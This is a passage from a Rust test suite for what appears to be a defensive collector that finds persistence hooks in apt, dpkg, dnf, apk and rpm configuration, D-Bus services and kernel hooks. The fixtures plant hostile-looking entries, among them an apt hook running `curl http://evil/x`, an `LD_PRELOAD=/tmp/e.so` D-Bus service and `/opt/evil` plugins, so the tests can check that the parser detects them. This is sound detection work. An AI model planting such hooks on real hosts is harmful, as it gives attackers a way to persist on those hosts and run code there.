        let keys: BTreeSet<&str> = of_kind(&s, Kind::PkgHook).iter().map(|e| e.raw["key"].as_str()).collect();
        assert_eq!(
            keys,
            BTreeSet::from(["dir::bin::dpkg", "dir::bin::methods", "acquire::http::proxy-auto-detect", "acquire::https::proxyautodetect"])
        );
        let dpkg = one(&s, |e| e.raw["key"] == "dir::bin::dpkg");
        assert_eq!(dpkg.target_path, Some(PathBuf::from("/opt/evil/dpkg")));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn an_include_is_an_entry_and_the_file_it_names_is_read() {
        let dir = tree("include");
        put(&dir, "etc/apt/apt.conf.d/10inc", b"#include \"/srv/extra.conf\";\n#include <relative.conf>\n");
        put(&dir, "srv/extra.conf", b"DPkg::Post-Invoke {\"/srv/hook\";};\n#include \"/etc/apt/apt.conf.d/10inc\";\n");
        let s = scan(&dir);
        let hook = one(&s, |e| e.command.as_deref() == Some(b"/srv/hook".as_slice()));
        assert_eq!(hook.source, dir.join("srv/extra.conf"), "the hook is attributed to the file it is in");
        let inc = one(&s, |e| e.raw.get("key").is_some_and(|k| k == "#include") && e.target_path == Some(PathBuf::from("/srv/extra.conf")));
        assert_eq!(inc.enabled, Enablement::Enabled);
        let rel = one(&s, |e| e.target_path == Some(PathBuf::from("relative.conf")));
        assert!(rel.raw.contains_key("not_followed"));
        // The cycle back to the first file ends: its include is one entry per file.
        assert_eq!(of_kind(&s, Kind::PkgHook).iter().filter(|e| e.raw.get("key").is_some_and(|k| k == "#include")).count(), 3);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn hostile_apt_conf_does_not_panic_or_lose_the_hook() {
        let dir = tree("hostile");
        let mut bad: Vec<u8> = Vec::new();
        // A comment holding a brace must not open or close a scope.
        bad.extend_from_slice(b"// DPkg::Post-Invoke { \"/tmp/commented\";};\n");
        bad.extend_from_slice(b"/* a block comment } with a brace { in it */\n");
        // A quoted string holding a semicolon, a brace and a `//` URL.
        bad.extend_from_slice(
            br#"DPkg::Post-Invoke {"/bin/sh -c 'curl http://evil/x; echo }'";};"#,
        );
        bad.extend_from_slice(b"\n");
        // Invalid UTF-8 in a command is evidence, not a crash.
        bad.extend_from_slice(b"DPkg::Pre-Invoke {\"/tmp/\xff\xfe\";};\n");
        // Unbalanced braces, both directions, and a value never closed. These
        // come last on purpose: a quote nobody closed swallows the rest of the
        // file, so any hook written below one is not reported — which is also
        // what apt does with the file, since it rejects it outright.
        bad.extend_from_slice(b"}}} ;;; {{{\n");
        bad.extend_from_slice(b"APT::Update::Post-Invoke {\"/tmp/unterminated\n");
        bad.extend_from_slice(b"\"\"\"\n");
        put(&dir, "etc/apt/apt.conf.d/99bad", &bad);

        // A config past the read cap: truncated and recorded, never fatal, and
        // everything inside the cap still parses.
        let line = format!(
            "DPkg::Post-Invoke {{\"/usr/bin/flood --arg={}\";}};\n",
            "A".repeat(500)
        );
        put(&dir, "etc/apt/apt.conf", line.repeat(2_400).as_bytes());
        // Ten megabytes of it, most of them a single unbroken token.
        sparse(
            &dir,
            "etc/apt/apt.conf.d/98huge",
            b"DPkg::Post-Invoke {\"/usr/bin/huge\";};\n",
            10 << 20,
        );

        let s = scan(&dir);
        if let Status::Failed { error } = status(&s) {
            panic!("hostile input killed the collector: {error}");
        }

        let quoted = one(&s, |e| {
            e.command.as_deref().is_some_and(|c| c.starts_with(b"/bin/sh"))
        });
        assert_eq!(
            quoted.command.as_deref().unwrap(),
            br#"/bin/sh -c 'curl http://evil/x; echo }'"#,
            "a semicolon, a brace and a // URL inside quotes are all part of the command"
        );
        assert!(
            !s.entries.iter().any(|e| e.name.contains("commented")
                || e.command.as_deref().is_some_and(|c| c.ends_with(b"/tmp/commented"))),
            "a hook inside a comment is not a hook"
        );

        let binary = one(&s, |e| e.has_flag(Flag::EncodingAnomaly));
        assert_eq!(binary.command.as_deref().unwrap(), b"/tmp/\xff\xfe");
        assert!(binary.raw.contains_key("command_hex"));

        let truncated = &s.header.collectors.iter().find(|c| c.name == "pkg").unwrap().truncated;
        assert!(
            truncated.iter().any(|t| t.contains("apt.conf")),
            "the truncated read must be recorded: {truncated:?}"
        );
        assert!(
            of_kind(&s, Kind::PkgHook).len() > 100,
            "the readable part of the flood still parsed"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn dpkg_maintainer_scripts_are_entries_with_the_script_as_the_target() {
        let dir = tree("dpkg");
        for f in ["bash.postinst", "bash.preinst", "bash.prerm", "bash.postrm", "bash.list", "bash.md5sums"] {
            put(&dir, &format!("var/lib/dpkg/info/{f}"), b"#!/bin/sh\nexit 0\n");
        }
        put(&dir, "var/lib/dpkg/info/fontconfig:amd64.postinst", b"#!/bin/sh\n");
        put(&dir, "var/lib/dpkg/info/fontconfig:amd64.triggers", b"# comment\ninterest /usr/share/fonts\n");

        let s = scan(&dir);
        assert_eq!(of_kind(&s, Kind::PkgHook).len(), 5, ".list and .md5sums are not scripts");

        let postinst = one(&s, |e| e.name == "bash:postinst");
        assert_eq!(postinst.trigger, Trigger::PackageOp);
        assert_eq!(postinst.principal.as_deref(), Some("root"));
        assert_eq!(postinst.command, None, "dpkg execs the file; there is no command string");
        assert_eq!(postinst.target_path, Some(dir.join("var/lib/dpkg/info/bash.postinst")));
        assert_eq!(postinst.raw.get("package").map(String::as_str), Some("bash"));
        assert!(!postinst.raw.contains_key("changed_after_install"), "written with its list, as dpkg does");

        let multiarch = one(&s, |e| e.name == "fontconfig:amd64:postinst");
        assert_eq!(multiarch.raw.get("package").map(String::as_str), Some("fontconfig"));
        assert_eq!(multiarch.raw.get("arch").map(String::as_str), Some("amd64"));
        assert_eq!(
            multiarch.raw.get("triggers").map(String::as_str),
            Some("interest /usr/share/fonts"),
            "a file trigger is why a postinst runs when nobody installed anything"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_maintainer_script_changed_long_after_its_package_list_is_noted() {
        use std::time::{Duration, UNIX_EPOCH};
        let list = UNIX_EPOCH + Duration::from_secs(1_700_000_000);
        // dpkg writes the list and then the scripts, moments apart.
        assert_eq!(changed_after_install(list + Duration::from_secs(3), list), None);
        // A layer extracted in bulk, or a restore, spreads them a little.
        assert_eq!(changed_after_install(list + crate::provenance::dpkg::INSTALL_WINDOW, list), None);
        // Removal rewrites the list and leaves the postrm older than it.
        assert_eq!(changed_after_install(list - Duration::from_secs(86_400), list), None);
        // Edited or planted a day later: dpkg did not write that.
        assert_eq!(changed_after_install(list + Duration::from_secs(86_400), list), Some(Duration::from_secs(86_400)));
    }

    #[test]
    fn dnf_and_yum_plugins_record_enablement_and_where_the_code_lives() {
        let dir = tree("dnf");
        put(&dir, "etc/dnf/plugins/copr.conf", b"[main]\nenabled=1\n");
        put(&dir, "etc/dnf/plugins/evil.conf", b"[main]\nenabled = True\n");
        put(&dir, "etc/dnf/plugins/quiet.conf", b"[main]\nenabled=0\n");
        put(&dir, "etc/dnf/plugins/nokey.conf", b"[main]\n");
        put(&dir, "usr/lib/python3.12/site-packages/dnf-plugins/copr.py", b"import dnf\n");
        put(&dir, "etc/yum/pluginconf.d/fastestmirror.conf", b"[main]\nenabled=1\n");
        put(&dir, "etc/dnf/dnf5-plugins/builddep.conf", b"[main]\nenabled=1\n");
        put(&dir, "usr/lib64/dnf5/plugins/builddep.so", b"\x7fELF");
        // Executes nothing: a list of packages that may not be removed.
        put(&dir, "etc/dnf/protected.d/dnf.conf", b"dnf\n");

        let s = scan(&dir);
        assert!(
            !s.entries.iter().any(|e| e.source.to_string_lossy().contains("protected.d")),
            "protected.d executes nothing"
        );

        let copr = one(&s, |e| e.name == "dnf-plugin:copr");
        assert_eq!(copr.enabled, Enablement::Enabled);
        assert_eq!(copr.trigger, Trigger::PackageOp);
        assert_eq!(
            copr.target_path,
            Some(dir.join("usr/lib/python3.12/site-packages/dnf-plugins/copr.py"))
        );
        assert_eq!(one(&s, |e| e.name == "dnf-plugin:evil").enabled, Enablement::Enabled);
        assert_eq!(one(&s, |e| e.name == "dnf-plugin:quiet").enabled, Enablement::Disabled);

        let nokey = one(&s, |e| e.name == "dnf-plugin:nokey");
        assert_eq!(nokey.enabled, Enablement::Unknown);
        assert!(nokey.has_flag(Flag::DegradedEnablement));
        assert!(nokey.raw.contains_key("code"), "the missing module is recorded, not guessed at");
        assert!(s.entries.iter().any(|e| e.name == "yum-plugin:fastestmirror"));

        // dnf5's plugins are shared objects, not python modules.
        let dnf5 = one(&s, |e| e.name == "dnf5-plugin:builddep");
        assert_eq!(dnf5.enabled, Enablement::Enabled);
        assert_eq!(dnf5.target_path, Some(dir.join("usr/lib64/dnf5/plugins/builddep.so")));

        // The global switch overrides every plugin's own answer.
        put(&dir, "etc/dnf/dnf.conf", b"[main]\ngpgcheck=1\nplugins=0\n");
        let s = scan(&dir);
        assert_eq!(one(&s, |e| e.name == "dnf-plugin:copr").enabled, Enablement::Disabled);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn apk_scripts_and_triggers_are_read_from_apks_own_archive() {
        use crate::provenance::apk::tests::{gzip, tar};
        let dir = tree("apk-hooks");
        put(&dir, "lib/apk/db/installed", b"C:Q1tUBevAL33YvpW2JlxUskPVRWq48=\nP:busybox\nV:1.37.0-r31\n\nC:Q1xvm97RfYRLbxsLtXZtLDXA1chQg=\nP:kmod\nV:33-r0\n\n");
        put(&dir, "lib/apk/db/triggers", b"Q1tUBevAL33YvpW2JlxUskPVRWq48= /bin /usr/bin /lib/modules/*\nQ1xvm97RfYRLbxsLtXZtLDXA1chQg= /lib/modules/*\n");
        let archive = tar(&[
            ("busybox-1.37.0-r31.X1b5405ebc02f7dd8be95b6265c54b243d5456ab8f.trigger", b"#!/bin/busybox sh\n/bin/busybox --install -s\n"),
            ("busybox-1.37.0-r31.X1b5405ebc02f7dd8be95b6265c54b243d5456ab8f.post-install", b"#!/bin/sh\n/sbin/setup-x\n"),
            ("alpine-baselayout-3.7.2-r1.Q1AAAAAAAAAAAAAAAAAAAAAAAAAAA=.pre-upgrade", b"#!/bin/sh\nexit 0\n"),
        ]);
        put(&dir, "lib/apk/db/scripts.tar.gz", &gzip(&archive));
        let s = scan(&dir);
        assert!(matches!(s.header.collectors[0].status, Status::Complete), "{:?}", s.header.collectors[0].status);
        let hooks: Vec<&Entry> = of_kind(&s, Kind::PkgHook).into_iter().filter(|e| e.raw.get("manager").is_some_and(|m| m == "apk")).collect();
        let mut names: Vec<&str> = hooks.iter().map(|e| e.name.as_str()).collect();
        names.sort();
        assert_eq!(names, ["alpine-baselayout:pre-upgrade", "busybox:post-install", "busybox:trigger", "kmod:trigger"]);
        let trigger = one(&s, |e| e.name == "busybox:trigger");
        assert_eq!(trigger.raw["fires_on"], "/bin, /usr/bin, /lib/modules/*");
        assert_eq!(trigger.raw["read_from"], "apk scripts archive");
        assert_eq!(trigger.raw["version"], "1.37.0-r31");
        assert_eq!(trigger.command.as_deref(), Some(b"#!/bin/busybox sh\n/bin/busybox --install -s\n".as_slice()));
        assert_eq!((trigger.trigger, trigger.enabled), (Trigger::PackageOp, Enablement::Enabled));
        assert_eq!(trigger.source, dir.join("lib/apk/db/scripts.tar.gz"));
        let kmod = one(&s, |e| e.name == "kmod:trigger");
        assert_eq!((kmod.enabled, kmod.raw["fires_on"].as_str()), (Enablement::Disabled, "/lib/modules/*"));
        assert_eq!(kmod.raw["not_run"], "no trigger script for it in the scripts archive");
        assert_eq!(kmod.source, dir.join("lib/apk/db/triggers"));
        assert!(one(&s, |e| e.name == "busybox:post-install").raw.get("fires_on").is_none());
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn rpm_transaction_plugins_are_read_from_macros_and_the_plugin_directory() {
        let dir = tree("rpm");
        put(
            &dir,
            "usr/lib/rpm/macros",
            b"# rpm defaults\n\
              %_target_cpu x86_64\n\
              %__transaction_selinux\t%{__plugindir}/selinux.so\n\
              %__transaction_systemd_inhibit %{__plugindir}/systemd_inhibit.so\n",
        );
        put(&dir, "usr/lib/rpm/macros.d/macros.fapolicyd", b"%__transaction_fapolicyd %{nil}\n");
        // The unshare plugin's settings share its macro prefix and load nothing.
        put(
            &dir,
            "usr/lib/rpm/macros.d/macros.transaction_unshare",
            b"%__transaction_unshare\t%{__plugindir}/unshare.so\n\
              %__transaction_unshare_paths /tmp:/home\n\
              %__transaction_unshare_nonet 1\n",
        );
        put(&dir, "etc/rpm/macros.local", b"%__transaction_evil /opt/evil.so \\\n  --now\n");
        put(&dir, "usr/lib/rpm/plugins/selinux.so", b"\x7fELF");
        put(&dir, "usr/lib/rpm/plugins/orphan.so", b"\x7fELF");
        std::os::unix::fs::symlink("usr/lib", dir.join("lib")).unwrap();

        let s = scan(&dir);
        let selinux = one(&s, |e| e.name == "__transaction_selinux");
        assert_eq!(selinux.trigger, Trigger::PackageOp);
        assert_eq!(selinux.enabled, Enablement::Enabled);
        assert_eq!(selinux.command.as_deref(), Some(b"%{__plugindir}/selinux.so".as_slice()));
        assert!(selinux.raw.get("caveat").is_some_and(|c| c.contains("rpmdb")));
        assert_eq!(
            selinux.raw.get("plugin").map(String::as_str),
            Some("selinux.so"),
            "the object's name is what joins this macro to the plugin file"
        );

        let off = one(&s, |e| e.name == "__transaction_fapolicyd");
        assert_eq!(off.enabled, Enablement::Disabled, "an empty macro turns the plugin off");
        assert_eq!(off.raw.get("role").map(String::as_str), Some("plugin"));

        let unshare = one(&s, |e| e.name == "__transaction_unshare");
        assert_eq!(unshare.enabled, Enablement::Enabled);
        assert_eq!(unshare.raw.get("role").map(String::as_str), Some("plugin"));
        for setting in ["__transaction_unshare_paths", "__transaction_unshare_nonet"] {
            let e = one(&s, |e| e.name == setting);
            assert_eq!(e.command, None, "a plugin setting loads nothing");
            assert_eq!(e.enabled, Enablement::NotApplicable);
            assert_eq!(e.raw.get("role").map(String::as_str), Some("plugin setting"));
        }
        assert_eq!(
            one(&s, |e| e.name == "__transaction_unshare_paths").raw.get("value").map(String::as_str),
            Some("/tmp:/home")
        );

        let evil = one(&s, |e| e.name == "__transaction_evil");
        assert_eq!(evil.command.as_deref(), Some(b"/opt/evil.so --now".as_slice()));
        assert_eq!(evil.target_path, Some(PathBuf::from("/opt/evil.so")));

        let wired = one(&s, |e| e.name == "plugin:selinux.so");
        assert_eq!(wired.enabled, Enablement::Enabled);
        assert_eq!(wired.target_path, Some(dir.join("usr/lib/rpm/plugins/selinux.so")));
        let orphan = one(&s, |e| e.name == "plugin:orphan.so");
        assert_eq!(orphan.enabled, Enablement::Unknown);
        assert!(orphan.has_flag(Flag::DegradedEnablement));
        fs::remove_dir_all(&dir).unwrap();
    }

    /// Headers as rpm writes them: the body tags are plain strings, and so is
    /// a one-word interpreter, whatever rpm's tag table says.
    fn scriptlet_db(dir: &Path, rel: &str) {
        use crate::provenance::rpm::tests::{HeaderBuilder, write_rpmdb};

        let mut systemd = HeaderBuilder::default();
        systemd
            .string(1000, "systemd")
            .string(1001, "259.9")
            .string(1002, "1.fc44")
            .string(1022, "x86_64")
            .bytes(1024, b"systemctl daemon-reload || :\n") // POSTIN
            .string(1086, "/bin/sh") // POSTINPROG
            .string_array(5076, &["units in", "user reload", "units postun", "services postun"])
            .string_array(5077, &["/bin/sh", "/bin/sh", "/bin/sh", "/bin/sh"])
            .string_array(
                5079,
                &[
                    "/etc/systemd/system/",
                    "/usr/lib/systemd/system/",
                    "/usr/lib/systemd/user/",
                    // The trap: two postun triggers on the same two paths,
                    // told apart only by what they do and when they run.
                    "/etc/systemd/system/",
                    "/usr/lib/systemd/system/",
                    "/etc/systemd/system/",
                    "/usr/lib/systemd/system/",
                ],
            )
            .ints(5080, &[0, 0, 1, 2, 2, 3, 3])
            .ints(5082, &[1 << 16, 1 << 16, 1 << 16, 1 << 18, 1 << 18, 1 << 18, 1 << 18])
            .ints(5085, &[900900, 1000099, 900899, 1000100]);

        let mut evil = HeaderBuilder::default();
        evil.string(1000, "evil")
            .string(1001, "1")
            .string(1002, "1")
            .string(1022, "noarch")
            .bytes(1023, b"/tmp/\xff\xfe --install") // PREIN
            .string(1085, "<lua>"); // PREINPROG

        write_rpmdb(&dir.join(rel), &[systemd.build(), evil.build()]);
    }

    #[test]
    fn a_second_installed_kernel_does_not_rename_the_first_ones_scriptlets() {
        use crate::provenance::rpm::tests::{HeaderBuilder, write_rpmdb};
        let kernel = |version: &str| {
            let mut h = HeaderBuilder::default();
            h.string(1000, "kernel-core").string(1001, version).string(1002, "1.fc44").string(1022, "x86_64").bytes(1024, b"depmod\n").string(1086, "/bin/sh");
            h.build()
        };
        let names = |order: &[&str]| {
            let dir = tree(&format!("kernels-{}", order.len()));
            write_rpmdb(&dir.join("var/lib/rpm/rpmdb.sqlite"), &order.iter().map(|v| kernel(v)).collect::<Vec<_>>());
            let s = scan(&dir);
            let mut names: Vec<String> = of_kind(&s, Kind::PkgHook).iter().map(|e| e.name.clone()).collect();
            names.sort();
            fs::remove_dir_all(&dir).unwrap();
            names
        };
        // One kernel: the plain name. Two: each named by its own version, in
        // whichever order the database holds them.
        assert_eq!(names(&["6.1.0"]), ["kernel-core.x86_64:%post"]);
        let both = ["kernel-core.x86_64:%post@6.1.0-1.fc44.x86_64", "kernel-core.x86_64:%post@6.2.0-1.fc44.x86_64"];
        assert_eq!(names(&["6.1.0", "6.2.0"]), both);
        assert_eq!(names(&["6.2.0", "6.1.0"]), both);
    }

    #[test]
    fn rpm_scriptlets_and_file_triggers_are_read_out_of_the_database() {
        let dir = tree("scriptlets");
        scriptlet_db(&dir, "var/lib/rpm/rpmdb.sqlite");
        put(&dir, "usr/lib/rpm/macros", b"%__transaction_selinux %{__plugindir}/selinux.so\n");

        let s = scan(&dir);
        if let Status::Failed { error } = status(&s) {
            panic!("the collector died on a database: {error}");
        }

        let post = one(&s, |e| e.name == "systemd.x86_64:%post");
        assert_eq!(post.kind, Kind::PkgHook);
        assert_eq!(post.trigger, Trigger::PackageOp);
        assert_eq!(post.principal.as_deref(), Some("root"));
        assert_eq!(post.enabled, Enablement::Enabled);
        assert_eq!(post.source, dir.join("var/lib/rpm/rpmdb.sqlite"));
        assert_eq!(post.command.as_deref(), Some(b"systemctl daemon-reload || :\n".as_slice()));
        assert_eq!(post.raw.get("package").map(String::as_str), Some("systemd"));
        assert_eq!(post.raw.get("version").map(String::as_str), Some("259.9-1.fc44.x86_64"));
        assert_eq!(post.raw.get("interpreter").map(String::as_str), Some("/bin/sh"));
        assert_eq!(
            post.target_path,
            Some(PathBuf::from("/bin/sh")),
            "what rpm execs is the interpreter, not a path quoted inside the body"
        );
        assert!(post.raw.contains_key("read_from"), "the source is a database, not the script");

        // The operator-relevant fact about a file trigger is which paths fire
        // it: this one runs whenever anything installs a unit file.
        let installed = one(&s, |e| {
            e.raw.get("scriptlet").is_some_and(|k| k == "%transfiletriggerin")
                && e.raw.get("fires_on").is_some_and(|p| p.starts_with("/etc/systemd/system/"))
        });
        assert_eq!(
            installed.raw.get("fires_on").map(String::as_str),
            Some("/etc/systemd/system/, /usr/lib/systemd/system/")
        );
        assert_eq!(installed.raw.get("priority").map(String::as_str), Some("900900"));
        assert_eq!(installed.command.as_deref(), Some(b"units in".as_slice()));

        // Two triggers of one type on one package, firing on the same paths.
        // They must be two entries with two ids, or the diff drops one.
        let twins: Vec<&Entry> = s
            .entries
            .iter()
            .filter(|e| e.raw.get("scriptlet").is_some_and(|k| k == "%transfiletriggerpostun"))
            .filter(|e| e.raw.get("fires_on").is_some_and(|p| p.contains("/etc/systemd/system/")))
            .collect();
        assert_eq!(twins.len(), 2);
        assert_ne!(twins[0].id, twins[1].id);

        let mut ids: Vec<&String> = s.entries.iter().map(|e| &e.id).collect();
        ids.sort();
        let total = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), total, "two entries share an id");

        // A lua scriptlet runs inside rpm itself, so it resolves to no file.
        let lua = one(&s, |e| e.name == "evil.noarch:%pre");
        assert_eq!(lua.raw.get("interpreter").map(String::as_str), Some("<lua>"));
        assert_eq!(lua.target_path, None);
        assert!(
            lua.raw.contains_key("target_unverifiable"),
            "a scriptlet rpm runs itself has no missing program"
        );
        assert!(lua.has_flag(Flag::EncodingAnomaly), "a body is bytes, not text");
        assert_eq!(lua.command.as_deref(), Some(b"/tmp/\xff\xfe --install".as_slice()));
        assert!(lua.raw.contains_key("command_hex"));

        // And the caveat on the configuration entries no longer claims that
        // what was just read cannot be seen.
        let plugin = one(&s, |e| e.name == "__transaction_selinux");
        let caveat = plugin.raw.get("caveat").map(String::as_str).unwrap_or_default();
        assert!(caveat.contains("reported as their own entries"), "stale caveat: {caveat}");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_host_with_no_rpmdb_says_so_rather_than_implying_there_are_none() {
        let dir = tree("nodb");
        put(&dir, "usr/lib/rpm/macros", b"%__transaction_selinux %{__plugindir}/selinux.so\n");
        let s = scan(&dir);
        let plugin = one(&s, |e| e.name == "__transaction_selinux");
        assert!(
            plugin.raw.get("caveat").is_some_and(|c| c.contains("no rpmdb")),
            "an unread database must not read as an empty one"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn the_database_under_usr_is_read_where_var_is_only_a_symlink_to_it() {
        // Fedora 36 moved the database under /usr and left /var/lib/rpm as a
        // symlink. Naming the symlink as an entry's source would report a
        // path no package owns, so every scriptlet on the host would read as
        // unpackaged — the one flag the tool leads with.
        let dir = tree("sysimage");
        scriptlet_db(&dir, "usr/lib/sysimage/rpm/rpmdb.sqlite");
        fs::create_dir_all(dir.join("var/lib")).unwrap();
        std::os::unix::fs::symlink("../../usr/lib/sysimage/rpm", dir.join("var/lib/rpm")).unwrap();

        let s = scan(&dir);
        let post = one(&s, |e| e.name == "systemd.x86_64:%post");
        assert_eq!(post.source, dir.join("usr/lib/sysimage/rpm/rpmdb.sqlite"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn dbus_service_files_carry_exec_user_and_the_systemd_unit() {
        let dir = tree("dbus");
        put(
            &dir,
            "usr/share/dbus-1/system-services/org.freedesktop.systemd1.service",
            b"[D-BUS Service]\n\
              Name=org.freedesktop.systemd1\n\
              Exec=/bin/false\n\
              User=root\n\
              SystemdService=dbus-org.freedesktop.systemd1.service\n",
        );
        put(
            &dir,
            "usr/share/dbus-1/system-services/net.evil.Helper.service",
            b"# installed by nobody\n\
              [D-BUS Service]\n\
              Name=net.evil.Helper\n\
              Exec=/usr/bin/env LD_PRELOAD=/tmp/e.so /opt/helper --daemon\n\
              User=backup\n",
        );
        put(
            &dir,
            "usr/share/dbus-1/services/org.gnome.Nothing.service",
            b"[Other Group]\nExec=/bin/true\n",
        );
        // Policy: grants access, executes nothing, gets no entry of its own.
        put(
            &dir,
            "etc/dbus-1/system.d/net.evil.Helper.conf",
            b"<busconfig><policy user=\"root\"><allow own=\"net.evil.Helper\"/>\
              <allow send_destination='net.evil.Helper'/></policy></busconfig>",
        );

        let s = scan_enriched(&dir);
        assert_eq!(of_kind(&s, Kind::DbusService).len(), 3);
        assert!(
            !s.entries.iter().any(|e| e.source.to_string_lossy().contains("system.d")),
            "a policy file grants access; it activates nothing"
        );

        let systemd = one(&s, |e| e.name == "org.freedesktop.systemd1.service");
        assert_eq!(systemd.kind, Kind::DbusService);
        assert_eq!(systemd.trigger, Trigger::Always, "anything on the bus can activate it");
        assert_eq!(systemd.enabled, Enablement::Enabled);
        assert_eq!(systemd.principal.as_deref(), Some("root"));
        assert_eq!(
            systemd.raw.get("systemd_service").map(String::as_str),
            Some("dbus-org.freedesktop.systemd1.service"),
            "the operator has to be able to join this to the systemd collector's entry"
        );
        assert_eq!(systemd.raw.get("bus").map(String::as_str), Some("system"));

        let evil = one(&s, |e| e.name == "net.evil.Helper.service");
        assert_eq!(evil.principal.as_deref(), Some("backup"), "User= is who it runs as");
        assert_eq!(
            evil.command.as_deref(),
            Some(b"/usr/bin/env LD_PRELOAD=/tmp/e.so /opt/helper --daemon".as_slice())
        );
        assert_eq!(evil.raw.get("env.LD_PRELOAD").map(String::as_str), Some("/tmp/e.so"));
        assert_eq!(evil.target_path, Some(dir.join("opt/helper")), "env is looked through to what it runs");
        assert!(
            evil.raw.get("policy_files").is_some_and(|p| p.ends_with("net.evil.Helper.conf")),
            "the policy governing this name belongs on the entry that executes"
        );

        let inert = one(&s, |e| e.name == "org.gnome.Nothing.service");
        assert_eq!(inert.enabled, Enablement::NotApplicable);
        assert_eq!(inert.command, None);
        assert!(inert.raw.contains_key("parse"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_service_directory_reached_by_two_names_is_walked_once() {
        let dir = tree("merged");
        put(
            &dir,
            "usr/lib/dbus-1/system-services/org.vendor.Agent.service",
            b"[D-BUS Service]\nName=org.vendor.Agent\nExec=/usr/libexec/agent\n",
        );
        // Merged /usr: lib/dbus-1/... and usr/lib/dbus-1/... are one directory.
        std::os::unix::fs::symlink("usr/lib", dir.join("lib")).unwrap();

        let s = scan(&dir);
        let found = of_kind(&s, Kind::DbusService);
        assert_eq!(found.len(), 1, "the vendor service was reported twice");
        assert!(
            found[0].source.to_string_lossy().contains("usr/lib/dbus-1"),
            "the canonical path is kept, got {}",
            found[0].source.display()
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn genuinely_separate_service_directories_are_both_walked() {
        let dir = tree("unmerged");
        put(
            &dir,
            "usr/share/dbus-1/system-services/a.service",
            b"[D-BUS Service]\nName=a\nExec=/bin/a\n",
        );
        put(
            &dir,
            "usr/local/share/dbus-1/system-services/b.service",
            b"[D-BUS Service]\nName=b\nExec=/bin/b\n",
        );
        let s = scan(&dir);
        assert_eq!(
            of_kind(&s, Kind::DbusService).len(),
            2,
            "deduplication must key on the inode, not on the name"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn invalid_utf8_and_oversized_files_survive_everywhere() {
        let dir = tree("bytes");
        // A non-UTF-8 file name and a non-UTF-8 Exec value.
        put(&dir, "var/lib/dpkg/info/pkg.postinst", b"#!/bin/sh\n");
        let raw_name = OsString::from_vec_compat(b"usr/share/dbus-1/system-services/\xff\xfe.service");
        let p = dir.join(&raw_name);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, b"[D-BUS Service]\nName=net.\xff\xfe\nExec=/opt/\xff\xfe --go\n").unwrap();

        // A 10 MB service file: read to the cap, parsed as far as it goes.
        sparse(
            &dir,
            "usr/share/dbus-1/system-services/org.huge.service",
            b"[D-BUS Service]\nName=org.huge\nExec=/bin/huge\n",
            10 << 20,
        );
        // And a 10 MB policy file, which is read but never emitted.
        sparse(&dir, "etc/dbus-1/system.d/huge.conf", b"<busconfig>", 10 << 20);

        let s = scan(&dir);
        if let Status::Failed { error } = status(&s) {
            panic!("oversized or non-UTF-8 input killed the collector: {error}");
        }
        let binary = one(&s, |e| e.kind == Kind::DbusService && e.has_flag(Flag::EncodingAnomaly));
        assert_eq!(binary.command.as_deref(), Some(b"/opt/\xff\xfe --go".as_slice()));
        assert!(binary.raw.contains_key("command_hex"));
        assert!(binary.raw.contains_key("name_raw_hex"), "the file name's bytes are kept too");

        let huge = one(&s, |e| e.name == "org.huge.service");
        assert_eq!(huge.command.as_deref(), Some(b"/bin/huge".as_slice()));
        fs::remove_dir_all(&dir).unwrap();
    }

    /// OsString::from_vec without pulling the trait into the module proper.
    trait FromVecCompat {
        fn from_vec_compat(v: &[u8]) -> OsString;
    }
    impl FromVecCompat for OsString {
        fn from_vec_compat(v: &[u8]) -> OsString {
            use std::os::unix::ffi::OsStringExt;
            OsString::from_vec(v.to_vec())
        }
    }

    #[test]
    fn kernel_hooks_run_as_the_hosts_run_parts_and_kernel_install_pick_them() {
        use std::os::unix::fs::PermissionsExt;
        let d = tree("kernel");
        let exe = |d: &Path, rel: &str, mode: u32| {
            put(d, rel, b"#!/bin/sh\n");
            std::fs::set_permissions(d.join(rel), std::fs::Permissions::from_mode(mode)).unwrap();
        };
        exe(&d, "etc/kernel/postinst.d/zz-beacon", 0o755);
        exe(&d, "etc/kernel/postinst.d/update.sh", 0o755);
        exe(&d, "etc/kernel/postrm.d/inert", 0o644);
        exe(&d, "usr/lib/kernel/install.d/50-depmod.install", 0o755);
        exe(&d, "usr/lib/kernel/install.d/90-loader.install", 0o755);
        exe(&d, "etc/kernel/install.d/90-loader.install", 0o755);
        std::fs::create_dir_all(d.join("etc/kernel/install.d")).unwrap();
        std::os::unix::fs::symlink("/dev/null", d.join("etc/kernel/install.d/50-depmod.install")).unwrap();
        let state = |s: &Scan, rel: &str| {
            s.entries.iter().find(|e| e.source == d.join(rel)).map(|e| (e.enabled, e.trigger)).unwrap_or_else(|| panic!("no {rel}"))
        };

        // No run-parts binary here: debianutils' rule, the default.
        let s = scan(&d);
        assert_eq!(state(&s, "etc/kernel/postinst.d/zz-beacon"), (Enablement::Enabled, Trigger::PackageOp));
        assert_eq!(state(&s, "etc/kernel/postinst.d/update.sh").0, Enablement::Disabled, "a dot is not in debianutils' rule");
        assert_eq!(state(&s, "etc/kernel/postrm.d/inert").0, Enablement::Disabled);
        assert_eq!(state(&s, "etc/kernel/install.d/50-depmod.install").0, Enablement::Masked);
        assert_eq!(state(&s, "etc/kernel/install.d/90-loader.install").0, Enablement::Enabled);
        assert_eq!(state(&s, "usr/lib/kernel/install.d/90-loader.install").0, Enablement::Disabled, "replaced by /etc");

        // Fedora's run-parts is a script, and runs a dotted name.
        exe(&d, "usr/bin/run-parts", 0o755);
        put(&d, "usr/bin/run-parts", b"#!/bin/bash\n");
        let s = scan(&d);
        assert_eq!(state(&s, "etc/kernel/postinst.d/update.sh").0, Enablement::Enabled);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
